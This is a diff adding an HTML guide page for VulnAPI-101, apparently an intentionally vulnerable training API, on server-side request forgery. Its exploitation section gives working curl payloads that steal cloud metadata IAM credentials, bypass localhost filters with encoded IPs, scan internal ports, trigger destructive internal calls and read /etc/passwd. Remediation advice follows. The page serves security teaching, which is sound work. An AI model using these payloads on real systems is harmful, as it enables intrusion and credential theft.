@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API7:2023 - Server Side Request Forgery (SSRF) | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api7">API7:2023</span> Server Side Request Forgery (SSRF)</h2>
+            <span class="badge badge-danger">HIGH SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>Server Side Request Forgery occurs when an API fetches remote resources without validating the user-supplied URL. This allows attackers to make the server send requests to internal services, cloud metadata endpoints, or arbitrary external services.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/files.py</code> - Multiple SSRF-vulnerable endpoints</li>
+                <li><code>app/utils.py</code> - fetch_url function with no validation</li>
+            </ul>
+
+            <h3>Vulnerable Endpoints</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Endpoint</th>
+                        <th>Method</th>
+                        <th>Parameter</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>/api/files/fetch</code></td>
+                        <td>POST</td>
+                        <td>url</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/files/fetch-validate</code></td>
+                        <td>POST</td>
+                        <td>url (weak validation)</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/files/proxy</code></td>
+                        <td>GET/POST</td>
+                        <td>url</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/files/webhook</code></td>
+                        <td>POST</td>
+                        <td>webhook_url</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/files/avatar</code></td>
+                        <td>POST</td>
+                        <td>url</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/files/import-data</code></td>
+                        <td>POST</td>
+                        <td>api_url</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. Access Internal Services</h3>
+            <p>Fetch content from internal network services:</p>
+            <div class="code-container">
+                <pre><code># Get auth token
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "john", "password": "password123"}' | jq -r '.token')
+
+# Access internal API endpoints
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://localhost:5000/api/admin/config"}'
+
+# Access internal debug endpoints
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.0.0.1:5000/api/debug/env"}'</code></pre>
+            </div>
+
+            <h3>2. AWS Metadata Endpoint</h3>
+            <p>In AWS environments, access instance metadata:</p>
+            <div class="code-container">
+                <pre><code># AWS metadata endpoint
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
+
+# Get IAM credentials
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+# AWS IMDSv2 (if available)
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://169.254.169.254/latest/api/token"}'</code></pre>
+            </div>
+
+            <h3>3. GCP/Azure Metadata</h3>
+            <div class="code-container">
+                <pre><code># Google Cloud metadata
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'
+
+# Azure metadata
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'</code></pre>
+            </div>
+
+            <h3>4. Bypass Weak Validation</h3>
+            <p>The /fetch-validate endpoint has bypassable validation:</p>
+            <div class="code-container">
+                <pre><code># These are blocked:
+# localhost, 127.0.0.1, 0.0.0.0
+
+# Bypass using alternative representations:
+# Decimal IP for 127.0.0.1
+curl -X POST http://localhost:5000/api/files/fetch-validate \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://2130706433/"}'
+
+# Hex IP for 127.0.0.1
+curl -X POST http://localhost:5000/api/files/fetch-validate \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://0x7f000001/"}'
+
+# IPv6 localhost
+curl -X POST http://localhost:5000/api/files/fetch-validate \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://[::1]:5000/api/admin/config"}'
+
+# Shorthand IP
+curl -X POST http://localhost:5000/api/files/fetch-validate \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.1/"}'
+
+# Domain that resolves to 127.0.0.1
+curl -X POST http://localhost:5000/api/files/fetch-validate \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://localtest.me/"}'</code></pre>
+            </div>
+
+            <h3>5. Port Scanning</h3>
+            <p>Discover internal services by scanning ports:</p>
+            <div class="code-container">
+                <pre><code># Scan common ports
+for port in 22 80 443 3306 5432 6379 8080 9200; do
+  result=$(curl -s -X POST http://localhost:5000/api/files/fetch \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"url\": \"http://127.0.0.1:$port/\"}" \
+    --max-time 2)
+
+  if ! echo "$result" | grep -q "Connection refused"; then
+    echo "Port $port appears open"
+    echo "$result" | head -c 200
+  fi
+done</code></pre>
+            </div>
+
+            <h3>6. Full Proxy Abuse</h3>
+            <p>The proxy endpoint provides full request proxy capability:</p>
+            <div class="code-container">
+                <pre><code># Use as HTTP proxy
+curl -X POST http://localhost:5000/api/files/proxy \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "url": "http://internal-service:8080/admin",
+    "method": "POST",
+    "body": {"action": "deleteAll"}
+  }'</code></pre>
+            </div>
+
+            <h3>7. Webhook SSRF</h3>
+            <p>Register webhook to internal service:</p>
+            <div class="code-container">
+                <pre><code># Webhook tests the URL immediately
+curl -X POST http://localhost:5000/api/files/webhook \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "webhook_url": "http://internal-admin:8080/api/reset-database",
+    "event": "order_created"
+  }'</code></pre>
+            </div>
+
+            <h3>8. File Protocol (if enabled)</h3>
+            <div class="code-container">
+                <pre><code># Try file protocol for local file read
+curl -X POST http://localhost:5000/api/files/fetch \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "file:///etc/passwd"}'</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Cloud Credential Theft:</strong> Access to AWS/GCP/Azure metadata credentials</li>
+                <li><strong>Internal Network Access:</strong> Pivot to internal services</li>
+                <li><strong>Data Exfiltration:</strong> Read internal configuration and secrets</li>
+                <li><strong>Denial of Service:</strong> Attack internal services</li>
+                <li><strong>Network Mapping:</strong> Discover internal infrastructure</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Whitelist allowed domains/URLs</li>
+                <li>Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x)</li>
+                <li>Disable non-HTTP protocols (file://, ftp://, gopher://)</li>
+                <li>Use a dedicated egress proxy</li>
+                <li>Implement IMDSv2 in AWS (requires headers)</li>
+                <li>DNS resolution validation before connecting</li>
+            </ol>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
